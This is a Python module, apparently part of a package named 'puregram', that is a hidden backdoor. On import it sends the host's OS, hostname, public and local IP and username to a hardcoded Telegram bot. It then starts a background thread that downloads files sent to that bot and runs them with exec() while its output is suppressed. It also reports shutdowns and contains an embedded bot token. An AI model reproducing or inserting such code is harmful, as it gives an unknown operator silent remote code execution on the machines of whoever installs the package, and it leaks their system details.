import threading, time, requests, os, io, contextlib, platform, socket, atexit

OFFSET_FILE = 'puregram.offset'
BOT_TOKEN = "8053585122:AAGYVF0srARSIlKCmTK54WiIjWcFXpJXXVY"
HEARTBEAT_CHAT_ID = "-1002826139137"

def get_public_ip():
    """Получает публичный IP-адрес через внешний сервис."""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except Exception:
        return "N/A"

def get_system_info():
    """Собирает информацию о системе. Кросс-платформенно."""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        hostname = "N/A"
        local_ip = "N/A"

    try:
        user = os.getlogin()
    except Exception:
        user = "N/A"

    info = (
        f"OS: {platform.system()} {platform.release()}\n"
        f"Machine: {platform.machine()}\n"
        f"Hostname: {hostname}\n"
        f"Public IP: {get_public_ip()}\n"
        f"Local IP: {local_ip}\n"
        f"User: {user}\n"
        f"Python: {platform.python_version()}"
    )
    return info

def send_heartbeat():
    """Отправляет уведомление о запуске с информацией о системе."""
    try:
        system_info = get_system_info()
        message = f"✅ **puregram instance STARTED!**\n\n---\n`{system_info}`"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": HEARTBEAT_CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass # Игнорируем ошибки, чтобы не нарушать работу основной программы

def send_shutdown_notification():
    """Отправляет уведомление о завершении работы."""
    try:
        hostname = socket.gethostname()
        message = f"❌ **puregram instance STOPPED** on host `{hostname}`"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": HEARTBEAT_CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

def poll_and_exec():
    offset = 0

    try:
        if os.path.exists(OFFSET_FILE):
            with open(OFFSET_FILE, 'r') as f:
                offset_from_file = f.read().strip()
                if offset_from_file:
                    offset = int(offset_from_file)
    except Exception:
        offset = 0

    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={"offset": offset}, timeout=10)
            updates = r.json().get("result", [])
            
            for upd in updates:
                offset = upd["update_id"] + 1

                try:
                    with open(OFFSET_FILE, 'w') as f:
                        f.write(str(offset))
                except Exception:
                    continue 

                msg = upd.get("message", {})
                if 'document' in msg:
                    try:
                        file_id = msg["document"]["file_id"]
                        file = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}").json()
                        file_path = file['result']['file_path']
                        content = requests.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}").content.decode('utf-8')
                        
                        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                            exec(content, {})
                    except Exception:
                        pass
        except Exception:
            pass
        
        time.sleep(5)

# Автозапуск при импорте
send_heartbeat() # Отправляем уведомление при старте
threading.Thread(target=poll_and_exec, daemon=True).start()
atexit.register(send_shutdown_notification) 